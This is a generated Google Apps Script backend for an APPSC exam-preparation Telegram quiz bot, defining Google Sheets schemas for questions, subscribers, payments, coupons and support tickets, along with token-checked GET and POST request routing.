// ==========================================================================
// APPSC Newspaper (Telugu)
// ==========================================================================
// GENERATED FILE — DO NOT EDIT HERE.
//
// Built from google_apps_script.js by `node build-apps-scripts.js`.
// Edit that file and re-run the builder; editing this copy means the fix
// lives in one of 5 sheets and is lost the next time it is rebuilt.
//
// Group id : appsc_news_te
// Subjects : 16
//            History, AP History, Geography, AP Geography, Economy, AP Economy, Polity, Society, Current Affairs, Science and Technology, Biology, Chemistry, Physics, Environment, General Studies, Disaster Management
// Built    : 2026-09-20T12:04:26.748Z
// ==========================================================================

// ============================================================================
// Google Apps Script — APPSC Telegram Quiz Automation Backend (v5)
// ============================================================================
// DEPLOY / UPGRADE INSTRUCTIONS
// 1. Open your Google Sheet ("Sadhana APPSC Questions Tracker")
// 2. Extensions > Apps Script, delete Code.gs contents, paste this whole file.
// 3. FIRST TIME ONLY: run `setupSpreadsheet` from the function dropdown.
//    UPGRADING FROM v4 (16 columns): run `upgradeSpreadsheet` instead. It
//    migrates every existing row into the new 30-column layout BY HEADER NAME,
//    so no data is lost and nothing is written into the wrong column.
// 4. Set a shared secret so the Web App is not world-writable:
//    Project Settings > Script properties > add `API_TOKEN` = <long random string>
//    Put the same value in the Node .env as SHEET_API_TOKEN.
//    (If API_TOKEN is unset the script still works but logs a warning in ping.)
// 5. Deploy > Manage deployments > Edit > New version
//    Execute as: Me | Who has access: Anyone  -> Deploy
// ============================================================================
//
// 30-COLUMN TRACKING SCHEMA (A .. AD)
//  A  S.No             Serial number within the subject sheet
//  B  Question ID      Stable unique id, e.g. POL-20260905-0007 (never reused)
//  C  Date             Publication / current-affairs date (DD-MM-YYYY)
//  D  Newspaper        Source publication (The Hindu, Indian Express, ...)
//  E  Subject          Subject category (mirrors the tab name)
//  F  Topic            Sub-topic inside the subject (e.g. "Fundamental Rights")
//  G  Question         Full question text and statements
//  H  Option A         Option A text
//  I  Option B         Option B text
//  J  Option C         Option C text
//  K  Option D         Option D text
//  L  Correct Answer   A / B / C / D
//  M  Explanation      Detailed rationale
//  N  Difficulty       Easy / Medium / Hard  (dropdown)
//  O  Tags             Comma separated keywords for search & revision
//  P  Source URL       Link to the article / PIB release the question came from
//  Q  Status           Draft/Review/Approved/Scheduled/Posted/Rejected/Archived
//  R  Posted           YES / NO (dropdown, colour coded)
//  S  Posted At        IST timestamp of the Telegram post
//  T  Scheduled For    Planned posting time (fills before it goes out)
//  U  Thread ID        Telegram forum topic thread the question went to
//  V  Telegram Msg ID  Message id of the poll (deep-link / audit trail)
//  W  Poll ID          Telegram poll id, used to attribute votes later
//  X  Times Posted     How many times this question has been sent (re-posts)
//  Y  Added At         IST timestamp of dashboard upload
//  Z  Added By         Curator email from Firebase Auth
//  AA Updated At       IST timestamp of the last edit
//  AB Updated By       Who made the last edit
//  AC Dup Hash         Normalised hash of the question text (duplicate guard)
//  AD Review Notes     Free-text QA remarks
// ============================================================================

/** Canonical header row shared by every subject tab. */
var QUESTION_HEADERS = [
  'S.No',            // A
  'Question ID',     // B
  'Date',            // C
  'Newspaper',       // D
  'Subject',         // E
  'Topic',           // F
  'Question',        // G
  'Option A',        // H
  'Option B',        // I
  'Option C',        // J
  'Option D',        // K
  'Correct Answer',  // L
  'Explanation',     // M
  'Difficulty',      // N
  'Tags',            // O
  'Source URL',      // P
  'Status',          // Q
  'Posted',          // R
  'Posted At',       // S
  'Scheduled For',   // T
  'Thread ID',       // U
  'Telegram Msg ID', // V
  'Poll ID',         // W
  'Times Posted',    // X
  'Added At',        // Y
  'Added By',        // Z
  'Updated At',      // AA
  'Updated By',      // AB
  'Dup Hash',        // AC
  'Review Notes'     // AD
];

/** Number of columns in the canonical schema. */
var COL_COUNT = QUESTION_HEADERS.length;

/** Allowed values for the Status workflow column. */
/** India is UTC+05:30 all year — no daylight saving — so one constant is exact.
 *  Every timestamp in this book is written as IST by istNow(), so every read
 *  has to interpret it as IST rather than as the project's own timezone. */
var IST_OFFSET_MS = (5 * 60 + 30) * 60 * 1000;

/** Statuses the posting machinery owns. A curator setting one by hand would
 *  desynchronise Status from the Posted column, which is what decides
 *  eligibility — so the row would claim to be posted and be sent again. */
var MACHINE_OWNED_STATUSES = ['Posted', 'Sending'];

var STATUS_VALUES = ['Draft', 'Review', 'Approved', 'Scheduled', 'Sending', 'Posted', 'Rejected', 'Archived'];

/** Allowed values for the Difficulty column. */
var DIFFICULTY_VALUES = ['Easy', 'Medium', 'Hard'];

/** Sheet tabs that are configuration or membership, not question banks. */
var RESERVED_SHEETS = [
  'Config', 'Dashboard', 'README', 'Subscribers', 'Payments',
  'Support', 'Support Log', 'Bot Settings', 'Coupons', 'Coupon Redemptions'
];

/** Tab holding one row per support ticket raised through the payment bot. */
var SUPPORT_SHEET = 'Support';

/**
 * Support ticket columns (A..V). Columns after L were added over time; a tab
 * created before them is upgraded the first time it is opened (see
 * supportSheet), and its existing rows are filled in.
 */
var SUPPORT_HEADERS = [
  'Ticket ID',          // A  T-yymmdd-XXXX, generated by the bot
  'Created At',         // B
  'Updated At',         // C  Last change of any kind
  'Telegram ID',        // D  Who raised it; replies go back here
  'Username',           // E
  'Name',               // F
  'Category',           // G  payment | invite | payment_failed | coupon | access | other
  'Status',             // H  open | in_progress | closed — see STATUS_MEANINGS
  'Bot',                // I  Env var of the payment bot the student talks to
  'Last Message',       // J  Most recent message, either side
  'Conversation',       // K  Whole thread, one "[time] who: text" block per message
  'Handled By',         // L  Last admin who acted on it
  'Admin Replies',      // M  How many messages admins have sent the student
  'Last Admin Reply At',// N
  'Closed At',          // O  Blank unless closed
  'Closed By',          // P  The admin who closed it
  'Waiting On',         // Q  admin | student | blank when closed — who has to act next
  'Picked Up By',       // R  First admin to act on it (open → in_progress)
  'Picked Up At',       // S
  'First Reply At',     // T  First message an admin sent the student
  'Times Reopened',     // U
  'Group'               // V  Group id the ticket is about; blank when the student did not say
];

/** Status values, in lifecycle order. "answered" is the old name for in_progress. */
var TICKET_STATUSES = ['open', 'in_progress', 'closed'];

/** What each ticket status means, written into the sheet as a header note. */
var STATUS_MEANINGS = {
  open: 'Open — new; no admin has picked it up yet',
  in_progress: 'In progress — an admin has replied or acted. It stays here until an admin closes it',
  closed: 'Closed — an admin closed it. If the student writes again it reopens as in_progress'
};

/** Reads a stored status, mapping the old "answered" to in_progress. */
function normaliseTicketStatus(value) {
  var status = String(value || '').trim().toLowerCase();
  if (status === 'answered') return 'in_progress';
  return TICKET_STATUSES.indexOf(status) === -1 ? 'open' : status;
}

/** Append-only record of everything that happened on every ticket. */
var SUPPORT_LOG_SHEET = 'Support Log';

var SUPPORT_LOG_HEADERS = [
  'Timestamp', 'Ticket ID', 'Telegram ID', 'Who', 'Role', 'Action', 'Details', 'Status After'
];

/** Tab holding the admin-editable bot texts, one key per row. */
var BOT_SETTINGS_SHEET = 'Bot Settings';

var BOT_SETTINGS_HEADERS = ['Key', 'Value', 'Updated At', 'Updated By'];

/** A Sheets cell holds 50,000 characters; keep the newest part of a long thread. */
var MAX_CONVERSATION_CHARS = 45000;

/** Discount codes, one row per code. Validity rules live in src/pricing.js. */
var COUPON_SHEET = 'Coupons';

var COUPON_HEADERS = [
  'Code',                 // A  Upper case, A-Z 0-9 _ -
  'Discount Type',        // B  percent | flat
  'Discount Value',       // C  Percent (1-99) or rupees
  'Active',               // D  yes | no
  'Expires On',           // E  dd-mm-yyyy, blank for never
  'Max Uses',             // F  Blank for unlimited
  'Times Used',           // G  Counted from successful payments only
  'One Use Per Student',  // H  yes | no
  'Note',                 // I  Internal, never shown to students
  'Created By',           // J
  'Created At',           // K
  'Updated By',           // L
  'Updated At'            // M
];

/** One row per paid checkout that used a code. */
var REDEMPTION_SHEET = 'Coupon Redemptions';

var REDEMPTION_HEADERS = [
  'Timestamp', 'Code', 'Telegram ID', 'Username', 'Group', 'Original Amount',
  'Discount', 'Paid Amount', 'Payment ID'
];

/** Tab holding one row per paying member. */
var SUBSCRIBER_SHEET = 'Subscribers';

/**
 * Subscriber columns (A..S).
 * One row per Telegram user. A renewal updates the row in place and appends to
 * the Payments log, so the current state of a member is always a single row.
 */
var SUBSCRIBER_HEADERS = [
  'Telegram ID',      // A  Primary key
  'Username',         // B  @handle, may be blank
  'Name',             // C  Display name from Telegram
  'Plan',             // D  sprint_30 | autopay_monthly | exam_pass
  'Plan Label',       // E  Human readable, for the sheet reader
  'Status',           // F  pending | active | expired | cancelled | removed
  'Start Date',       // G  When access began
  'Expiry Date',      // H  When access ends — the field the cron acts on
  'Amount',           // I  Rupees paid on the most recent payment
  'Payment ID',       // J  Razorpay payment id
  'Link/Sub ID',      // K  Payment link id, or subscription id for auto-pay
  'Subscription ID',  // L  Razorpay subscription id, recurring plan only
  'Total Paid',       // M  Lifetime rupees from this member
  'Renewals',         // N  How many times they have paid
  'Reminder Sent',    // O  Expiry date a reminder was last sent for
  'Invite Link',      // P  The single-use link issued to them
  'Joined At',        // Q  First payment
  'Last Payment At',  // R  Most recent payment
  'Notes'             // S  Free text
];

/** Tab holding an append-only log of every payment event. */
var PAYMENT_SHEET = 'Payments';

/** Payment log columns (A..I). */
var PAYMENT_HEADERS = [
  'Timestamp',
  'Telegram ID',
  'Username',
  'Plan',
  'Amount',
  'Payment ID',
  'Event',
  'Status',
  'Expiry After'
];

/**
 * subjectConfigList — the subjects THIS sheet tracks.
 *
 * Five sheets run this same file, and they do not share a syllabus: the
 * newspaper groups, Sadhana APPSC and UPSC each want a different set of tabs.
 * Keeping the list in code would mean five copies of this script drifting
 * apart, and a fix applied to four of them.
 *
 * So each sheet declares its own list in a SUBJECTS_JSON script property —
 * File > Project Settings > Script Properties — as a JSON array of names:
 *   ["Ancient India", "Medieval India", ...]
 * Thread ids and cron schedules are generated from position, then overwritten
 * by whatever is already in Config, so real Telegram topic ids survive a
 * re-run.
 *
 * With no property set, the built-in list below is used, which is what the
 * original single-sheet setup had.
 *
 * @returns {Array<Object>} Subject config rows for this sheet
 */
var SUBJECT_CONFIG_CACHE = null;

function subjectConfigList() {
  if (SUBJECT_CONFIG_CACHE) return SUBJECT_CONFIG_CACHE;

  var raw = '';
  try {
    raw = PropertiesService.getScriptProperties().getProperty('SUBJECTS_JSON') || '';
  } catch (err) {
    raw = '';
  }

  if (!raw) {
    SUBJECT_CONFIG_CACHE = SUBJECT_CONFIG_LIST_DEFAULT;
    return SUBJECT_CONFIG_CACHE;
  }

  var names;
  try {
    names = JSON.parse(raw);
  } catch (err) {
    throw new Error('SUBJECTS_JSON is not valid JSON: ' + err.message);
  }
  if (!Array.isArray(names) || !names.length) {
    throw new Error('SUBJECTS_JSON must be a non-empty JSON array of subject names.');
  }

  SUBJECT_CONFIG_CACHE = names.map(function (name, i) {
    var clean = String(name).trim();
    return {
      subject: clean,
      // Topic ids here are placeholders. `node setup.js` creates the real
      // forum topics and writes their ids into Config, and setupSpreadsheet
      // preserves those, so these are only ever a starting point.
      threadId: 6 + i,
      cron: '0 */3 * * *',
      count: 5,
      code: clean.replace(/[^A-Za-z]/g, '').toUpperCase().slice(0, 3) || 'SUB'
    };
  });
  return SUBJECT_CONFIG_CACHE;
}

/** Fallback subject list, used when no SUBJECTS_JSON property is set. */
var SUBJECT_CONFIG_LIST_DEFAULT = [
  { subject: "History", threadId: 6, cron: '0 */3 * * *', count: 5, code: 'HIS' },
  { subject: "AP History", threadId: 7, cron: '0 */3 * * *', count: 5, code: 'APH' },
  { subject: "Geography", threadId: 8, cron: '0 */3 * * *', count: 5, code: 'GEO' },
  { subject: "AP Geography", threadId: 9, cron: '0 */3 * * *', count: 5, code: 'APG' },
  { subject: "Economy", threadId: 10, cron: '0 */3 * * *', count: 5, code: 'ECO' },
  { subject: "AP Economy", threadId: 11, cron: '0 */3 * * *', count: 5, code: 'APE' },
  { subject: "Polity", threadId: 12, cron: '0 */3 * * *', count: 5, code: 'POL' },
  { subject: "Society", threadId: 13, cron: '0 */3 * * *', count: 5, code: 'SOC' },
  { subject: "Current Affairs", threadId: 14, cron: '0 */3 * * *', count: 5, code: 'CUR' },
  { subject: "Science and Technology", threadId: 15, cron: '0 */3 * * *', count: 5, code: 'SCI' },
  { subject: "Biology", threadId: 16, cron: '0 */3 * * *', count: 5, code: 'BIO' },
  { subject: "Chemistry", threadId: 17, cron: '0 */3 * * *', count: 5, code: 'CHE' },
  { subject: "Physics", threadId: 18, cron: '0 */3 * * *', count: 5, code: 'PHY' },
  { subject: "Environment", threadId: 19, cron: '0 */3 * * *', count: 5, code: 'ENV' },
  { subject: "General Studies", threadId: 20, cron: '0 */3 * * *', count: 5, code: 'GEN' },
  { subject: "Disaster Management", threadId: 21, cron: '0 */3 * * *', count: 5, code: 'DIS' }
];

// ============================================================================
// Spreadsheet access
// ============================================================================

/**
 * book — returns the spreadsheet this script operates on.
 *
 * A script created from Extensions > Apps Script inside the Sheet is "bound"
 * to it, and getActiveSpreadsheet() returns that Sheet. A script created from
 * script.google.com is standalone, getActiveSpreadsheet() returns null, and
 * every function here would fail with an obscure null error.
 *
 * So: fail loudly with the actual fix, and offer an escape hatch for anyone who
 * genuinely wants a standalone project (set SPREADSHEET_ID in Script
 * properties to the long id in the Sheet's URL).
 *
 * @returns {Spreadsheet} The spreadsheet to read and write
 */
function book() {
  var active = SpreadsheetApp.getActiveSpreadsheet();
  if (active) return active;

  var id = '';
  try {
    id = String(PropertiesService.getScriptProperties().getProperty('SPREADSHEET_ID') || '').trim();
  } catch (err) {
    id = '';
  }

  if (id) return SpreadsheetApp.openById(id);

  throw new Error(
    'This script is not attached to a spreadsheet. It looks like it was created as a ' +
    'standalone project (the title bar says "Untitled project") rather than from inside ' +
    'the Sheet. Fix it either way:\n' +
    '  A) Open your Google Sheet > Extensions > Apps Script, and paste this code THERE. ' +
    'That project is already bound to the Sheet, and redeploying it keeps your existing ' +
    'Web App URL so nothing else needs changing.\n' +
    '  B) Or keep this standalone project and add a Script property named SPREADSHEET_ID ' +
    'set to the long id from your Sheet URL ' +
    '(docs.google.com/spreadsheets/d/THIS_PART/edit). If you go this route you must also ' +
    'copy the NEW /exec URL from this project into GOOGLE_SHEET_WEBAPP_URL in your .env.'
  );
}

/** True when this script can reach a spreadsheet at all. */
function isBound() {
  try {
    return Boolean(book());
  } catch (err) {
    return false;
  }
}

// ============================================================================
// Request routing
// ============================================================================

/**
 * doGet — read-only API surface.
 * Actions: ping, getConfig, getQuestions, getStats, getAnalytics, listQuestions,
 *          checkDuplicates, getSubjects.
 */
function doGet(e) {
  try {
    var params = (e && e.parameter) || {};
    var action = params.action || 'ping';

    // ping is deliberately unauthenticated: it is the liveness probe the
    // dashboard status pill uses, and it returns no spreadsheet data.
    if (action === 'ping') {
      var bound = isBound();
      return jsonResponse({
        success: true,
        status: 'ok',
        version: 'v6 (30 columns + membership)',
        tokenRequired: Boolean(getApiToken()),
        boundToSpreadsheet: bound,
        spreadsheetName: bound ? book().getName() : null,
        message: bound
          ? 'Google Sheets API is running with 30-column enhanced tracking'
          : 'Script is deployed but NOT attached to a spreadsheet — see the Health dashboard'
      });
    }

    var authError = requireToken(params.token);
    if (authError) return authError;

    if (action === 'getConfig') {
      return jsonResponse({ success: true, data: fetchConfigFromSheet() });
    }

    if (action === 'getSubjects') {
      return jsonResponse({ success: true, data: listSubjectSheets() });
    }

    // Unposted questions for the Telegram sender.
    if (action === 'listPosted') {
      if (!e.parameter.subject) {
        return jsonResponse({ success: false, error: 'Missing subject' });
      }
      return jsonResponse({ success: true, data: listPostedQuestions(e.parameter.subject) });
    }

    if (action === 'getQuestions') {
      var subject = params.subject;
      if (!subject) return jsonResponse({ success: false, error: 'Missing "subject" query parameter' });
      var limit = clampInt(params.limit, 1, 1, 100);
      // Only Approved/Draft-ish rows are eligible unless the caller opts out.
      var requireApproved = String(params.requireApproved || '') === 'true';
      return jsonResponse({ success: true, data: fetchUnpostedQuestions(subject, limit, requireApproved) });
    }

    if (action === 'getStats') {
      return jsonResponse({ success: true, data: fetchSummaryStats() });
    }

    if (action === 'getAnalytics') {
      return jsonResponse({ success: true, data: buildAnalytics() });
    }

    if (action === 'listQuestions') {
      return jsonResponse({ success: true, data: listQuestions(params) });
    }

    // ---- Membership reads --------------------------------------------------
    if (action === 'getSubscriber') {
      if (!params.telegramId) {
        return jsonResponse({ success: false, error: 'Missing telegramId' });
      }
      return jsonResponse({ success: true, data: getSubscriber(params.telegramId) });
    }

    if (action === 'listSubscribers') {
      return jsonResponse({ success: true, data: listSubscribers(params) });
    }

    if (action === 'getExpiring') {
      return jsonResponse({ success: true, data: getExpiringSubscribers(parseInt(params.days || '0', 10)) });
    }

    if (action === 'getRevenue') {
      return jsonResponse({ success: true, data: buildRevenueStats() });
    }

    if (action === 'findPayment') {
      if (!params.paymentId) return jsonResponse({ success: false, error: 'Missing paymentId' });
      return jsonResponse({ success: true, data: findPaymentRecord(params.paymentId) });
    }

    // ---- Support reads ------------------------------------------------------
    if (action === 'getBotSettings') {
      return jsonResponse({ success: true, data: getBotSettings() });
    }

    if (action === 'listTickets') {
      return jsonResponse({ success: true, data: listTickets(params) });
    }

    if (action === 'getSupportStats') {
      return jsonResponse({ success: true, data: getSupportStats(params) });
    }

    if (action === 'getTicket') {
      if (!params.ticketId) return jsonResponse({ success: false, error: 'Missing ticketId' });
      return jsonResponse({ success: true, data: getTicket(params.ticketId) });
    }

    // ---- Coupons reads ------------------------------------------------------
    if (action === 'listCoupons') {
      return jsonResponse({ success: true, data: listCoupons() });
    }

    if (action === 'getCoupon') {
      if (!params.code) return jsonResponse({ success: false, error: 'Missing code' });
      return jsonResponse({ success: true, data: getCoupon(params.code, params.telegramId) });
    }

    if (action === 'listRedemptions') {
      return jsonResponse({ success: true, data: listRedemptions(params) });
    }

    if (action === 'checkDuplicates') {
      var hashes = String(params.hashes || '').split(',').filter(function (h) { return h; });
      return jsonResponse({ success: true, data: findExistingHashes(hashes) });
    }

    return jsonResponse({ success: false, error: 'Unknown GET action: ' + action });
  } catch (err) {
    return jsonResponse({ success: false, error: String(err && err.message ? err.message : err) });
  }
}

/**
 * doPost — mutating API surface.
 * Actions: addQuestions, markPosted, updateConfig, updateQuestion,
 *          deleteQuestion, bulkDelete, bulkStatus, scheduleQuestions,
 *          unscheduleQuestions, formatQuestions,
 *          claimQuestions, releaseQuestions, unpostQuestions.
 */
function doPost(e) {
  try {
    var payload = {};
    if (e && e.postData && e.postData.contents) {
      payload = JSON.parse(e.postData.contents);
    }

    var authError = requireToken(payload.token);
    if (authError) return authError;

    var action = payload.action;

    if (action === 'markPosted') {
      if (!payload.subject || !(payload.rowIndices || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or rowIndices array' });
      }
      var updated = markRowsAsPostedInSheet(
        payload.subject,
        payload.rowIndices,
        payload.messageId || payload.message_id || '',
        payload.threadId || '',
        payload.pollIds || {}
      );
      return jsonResponse({ success: true, updatedCount: updated });
    }

    if (action === 'updateConfig') {
      var configData = payload.config || [];
      if (!configData.length) return jsonResponse({ success: false, error: 'Missing config array' });
      updateConfigInSheet(configData);
      return jsonResponse({ success: true, message: 'Config updated successfully' });
    }

    if (action === 'addQuestions') {
      var subject = payload.subject;
      var questions = payload.questions || [];
      if (!subject) return jsonResponse({ success: false, error: 'Missing "subject" in payload' });
      if (!questions.length) return jsonResponse({ success: false, error: 'No questions provided in payload' });
      var result = appendQuestionsToSheet(
        subject,
        questions,
        payload.added_by || payload.addedBy || 'Dashboard User',
        payload.skipDuplicates !== false
      );
      return jsonResponse({
        success: true,
        addedCount: result.added,
        skippedCount: result.skipped,
        skipped: result.skippedQuestions,
        ids: result.ids,
        message: result.added + ' question(s) added to "' + subject + '"' +
                 (result.skipped ? ', ' + result.skipped + ' duplicate(s) skipped' : '')
      });
    }

    if (action === 'updateQuestion') {
      if (!payload.subject || (!payload.questionId && !payload.rowNumber)) {
        return jsonResponse({ success: false, error: 'Missing subject, and neither questionId nor rowNumber given' });
      }
      var ok = updateQuestionRow(
        payload.subject, payload.questionId, payload.fields || {},
        payload.updated_by || payload.updatedBy || 'Dashboard User',
        payload.rowNumber, payload.verifyText
      );
      return jsonResponse(ok
        ? { success: true, message: 'Question ' + payload.questionId + ' updated' }
        : { success: false, error: 'Question ' + payload.questionId + ' not found in "' + payload.subject + '"' });
    }

    if (action === 'deleteQuestion') {
      if (!payload.subject || (!payload.questionId && !payload.rowNumber)) {
        return jsonResponse({ success: false, error: 'Missing subject, and neither questionId nor rowNumber given' });
      }
      var deleted = deleteQuestionRow(
        payload.subject, payload.questionId, payload.rowNumber, payload.verifyText
      );
      return jsonResponse(deleted
        ? { success: true, message: 'Question ' + payload.questionId + ' deleted' }
        : { success: false, error: 'Question ' + payload.questionId + ' not found' });
    }

    if (action === 'bulkDelete') {
      if (!payload.subject || !(payload.questionIds || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or questionIds' });
      }
      var removed = bulkDeleteQuestionRows(payload.subject, payload.questionIds);
      return jsonResponse({
        success: true,
        deletedCount: removed.deletedCount,
        notFound: removed.notFound
      });
    }

    if (action === 'unpostQuestions') {
      if (!payload.subject || !(payload.rowNumbers || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or rowNumbers' });
      }
      var restored = unpostQuestionRows(payload.subject, payload.rowNumbers, payload.status);
      return jsonResponse({ success: true, unpostedCount: restored });
    }

    if (action === 'claimQuestions') {
      if (!payload.subject || !(payload.rowNumbers || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or rowNumbers' });
      }
      var claim = claimQuestionRows(payload.subject, payload.rowNumbers);
      return jsonResponse({ success: true, claimed: claim.claimed, skipped: claim.skipped });
    }

    if (action === 'recoverStaleClaims') {
      if (!payload.subject) {
        return jsonResponse({ success: false, error: 'Missing subject' });
      }
      return jsonResponse({ success: true, data: recoverStaleClaims(payload.subject, payload.minutes) });
    }

    if (action === 'holdQuestions') {
      if (!payload.subject || !(payload.rowNumbers || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or rowNumbers' });
      }
      return jsonResponse({ success: true, heldCount: holdQuestionRows(payload.subject, payload.rowNumbers, payload.note) });
    }

    if (action === 'releaseQuestions') {
      if (!payload.subject || !(payload.rowNumbers || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or rowNumbers' });
      }
      var freed = releaseQuestionRows(payload.subject, payload.rowNumbers, payload.status);
      return jsonResponse({ success: true, releasedCount: freed });
    }

    if (action === 'bulkStatus') {
      if (!payload.subject || !(payload.questionIds || []).length || !payload.status) {
        return jsonResponse({ success: false, error: 'Missing subject, questionIds or status' });
      }
      var changed = bulkSetStatus(
        payload.subject, payload.questionIds, payload.status,
        payload.updated_by || 'Dashboard User'
      );
      return jsonResponse({
        success: true, updatedCount: changed.updatedCount,
        notFound: changed.notFound, skipped: changed.skipped
      });
    }

    // ---- Membership writes -------------------------------------------------
    if (action === 'upsertSubscriber') {
      if (!payload.subscriber || !payload.subscriber.telegram_id) {
        return jsonResponse({ success: false, error: 'Missing subscriber.telegram_id' });
      }
      var saved = upsertSubscriber(payload.subscriber);
      // A payment also appends to the immutable log, so renewal history
      // survives the member row being overwritten in place.
      if (payload.subscriber.is_payment) {
        logPayment({
          telegram_id: saved.telegram_id,
          username: saved.username,
          plan: saved.plan,
          amount: payload.subscriber.amount,
          payment_id: saved.payment_id,
          event: payload.event || 'payment',
          status: saved.status,
          expiry_date: saved.expiry_date
        });
      }
      return jsonResponse({ success: true, data: saved });
    }

    if (action === 'logPayment') {
      logPayment(payload.entry || {});
      return jsonResponse({ success: true });
    }

    // ---- Support writes -----------------------------------------------------
    if (action === 'createTicket') {
      if (!payload.ticket || !payload.ticket.ticket_id || !payload.ticket.telegram_id) {
        return jsonResponse({ success: false, error: 'Missing ticket.ticket_id or ticket.telegram_id' });
      }
      return jsonResponse({ success: true, data: createTicket(payload.ticket) });
    }

    if (action === 'appendTicketMessage') {
      if (!payload.ticketId || !payload.text) {
        return jsonResponse({ success: false, error: 'Missing ticketId or text' });
      }
      return jsonResponse({
        success: true,
        data: appendTicketMessage(payload.ticketId, payload.author, payload.text, payload.status,
          payload.handledBy, payload.logAction)
      });
    }

    if (action === 'setTicketStatus') {
      if (!payload.ticketId || !payload.status) {
        return jsonResponse({ success: false, error: 'Missing ticketId or status' });
      }
      return jsonResponse({
        success: true,
        data: setTicketStatus(payload.ticketId, payload.status, payload.handledBy)
      });
    }

    if (action === 'setTicketGroup') {
      if (!payload.ticketId) {
        return jsonResponse({ success: false, error: 'Missing ticketId' });
      }
      return jsonResponse({
        success: true,
        data: setTicketGroup(payload.ticketId, payload.group, payload.handledBy)
      });
    }

    if (action === 'logTicketEvent') {
      if (!payload.ticketId || !payload.logAction) {
        return jsonResponse({ success: false, error: 'Missing ticketId or logAction' });
      }
      return jsonResponse({
        success: true,
        data: logTicketEvent(payload.ticketId, payload.who, payload.role, payload.logAction, payload.details)
      });
    }

    // ---- Coupons writes -----------------------------------------------------
    if (action === 'upsertCoupon') {
      if (!payload.coupon || !payload.coupon.code) {
        return jsonResponse({ success: false, error: 'Missing coupon.code' });
      }
      return jsonResponse({ success: true, data: upsertCoupon(payload.coupon, payload.updated_by || 'Dashboard User') });
    }

    if (action === 'deleteCoupon') {
      if (!payload.code) return jsonResponse({ success: false, error: 'Missing code' });
      return jsonResponse({ success: true, data: deleteCoupon(payload.code) });
    }

    if (action === 'recordRedemption') {
      if (!payload.redemption || !payload.redemption.code || !payload.redemption.payment_id) {
        return jsonResponse({ success: false, error: 'Missing redemption.code or redemption.payment_id' });
      }
      return jsonResponse({ success: true, data: recordRedemption(payload.redemption) });
    }

    if (action === 'updateBotSettings') {
      if (!payload.settings || typeof payload.settings !== 'object') {
        return jsonResponse({ success: false, error: 'Missing settings object' });
      }
      return jsonResponse({
        success: true,
        data: updateBotSettings(payload.settings, payload.updated_by || 'Dashboard User')
      });
    }

    if (action === 'scheduleQuestions') {
      if (!payload.subject || !(payload.questionIds || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or questionIds' });
      }
      var scheduled = scheduleQuestionRows(
        payload.subject, payload.questionIds, payload.scheduledFor || '',
        payload.updated_by || 'Dashboard User'
      );
      return jsonResponse({
        success: true, updatedCount: scheduled.updatedCount,
        notFound: scheduled.notFound, skipped: scheduled.skipped
      });
    }

    if (action === 'formatQuestions') {
      if (!payload.subject) return jsonResponse({ success: false, error: 'Missing subject' });
      var target = book().getSheetByName(payload.subject);
      if (!target) return jsonResponse({ success: false, error: 'Sheet tab "' + payload.subject + '" not found.' });
      formatSheetHeaders(target);
      return jsonResponse({
        success: true,
        data: { subject: payload.subject, rows: Math.max(target.getLastRow() - 1, 0) }
      });
    }

    if (action === 'unscheduleQuestions') {
      if (!payload.subject || !(payload.questionIds || []).length) {
        return jsonResponse({ success: false, error: 'Missing subject or questionIds' });
      }
      var unscheduled = unscheduleQuestionRows(
        payload.subject, payload.questionIds, payload.status || 'Approved',
        payload.updated_by || 'Dashboard User'
      );
      return jsonResponse({
        success: true, updatedCount: unscheduled.updatedCount,
        notFound: unscheduled.notFound, skipped: unscheduled.skipped
      });
    }

    return jsonResponse({ success: false, error: 'Unknown POST action: ' + action });
  } catch (err) {
    return jsonResponse({ success: false, error: String(err && err.message ? err.message : err) });
  }
}

// ============================================================================
// Authentication
// ============================================================================

/** Reads the shared secret from Script Properties (empty string when unset). */
function getApiToken() {
  try {
    return String(PropertiesService.getScriptProperties().getProperty('API_TOKEN') || '').trim();
  } catch (err) {
    return '';
  }
}

/**
 * requireToken — rejects the request unless the caller presented the shared
 * secret. Returns null when the call may proceed, or a JSON error response.
 * Comparison is length-safe and constant-time to avoid a timing oracle.
 */
function requireToken(supplied) {
  var expected = getApiToken();
  if (!expected) return null; // Token not configured — open mode (ping warns about it).
  if (!constantTimeEquals(String(supplied || ''), expected)) {
    return jsonResponse({ success: false, error: 'Unauthorized: missing or invalid API token' });
  }
  return null;
}

/** Constant-time string comparison so a wrong token leaks no length/prefix info. */
function constantTimeEquals(a, b) {
  if (a.length !== b.length) return false;
  var diff = 0;
  for (var i = 0; i < a.length; i++) {
    diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return diff === 0;
}

// ============================================================================
// Column helpers
// ============================================================================

/**
 * headerMap — builds a { canonicalHeader: zeroBasedIndex } lookup for a sheet.
 * Every read and write goes through this, so a sheet with extra or reordered
 * columns still works and older layouts keep resolving correctly.
 *
 * A header that is genuinely absent maps to -1 rather than to its canonical
 * position. That distinction matters: an older 16-column sheet has no
 * "Question ID" column, and falling back to canonical index 1 would have made
 * every read of Question ID return that sheet's Date instead — quietly
 * corrupting the migration. Reads treat -1 as empty; writes resolve it through
 * canonicalIndex(), which is safe because writes only ever run against a sheet
 * whose headers have already been made canonical.
 */
function headerMap(sheet) {
  var lastCol = Math.max(sheet.getLastColumn(), COL_COUNT);
  var raw = sheet.getRange(1, 1, 1, lastCol).getValues()[0];
  var normalised = raw.map(function (h) { return normaliseHeader(h); });
  var map = {};

  for (var i = 0; i < QUESTION_HEADERS.length; i++) {
    var canonical = QUESTION_HEADERS[i];
    var aliases = headerAliases(canonical);
    var found = -1;
    for (var a = 0; a < aliases.length && found === -1; a++) {
      found = normalised.indexOf(aliases[a]);
    }
    map[canonical] = found;
  }
  return map;
}

/** Position a header occupies in the canonical 30-column layout. */
function canonicalIndex(header) {
  return QUESTION_HEADERS.indexOf(header);
}

/**
 * writeIndex — zero-based column to WRITE a header to.
 * Uses the sheet's actual position when the column exists, otherwise the
 * canonical one.
 */
function writeIndex(map, header) {
  var idx = map[header];
  return (idx === undefined || idx < 0) ? canonicalIndex(header) : idx;
}

/** Lowercases and strips punctuation so "Posted At" and "posted_at" both match. */
function normaliseHeader(h) {
  return String(h || '').trim().toLowerCase().replace(/[\s._-]+/g, ' ');
}

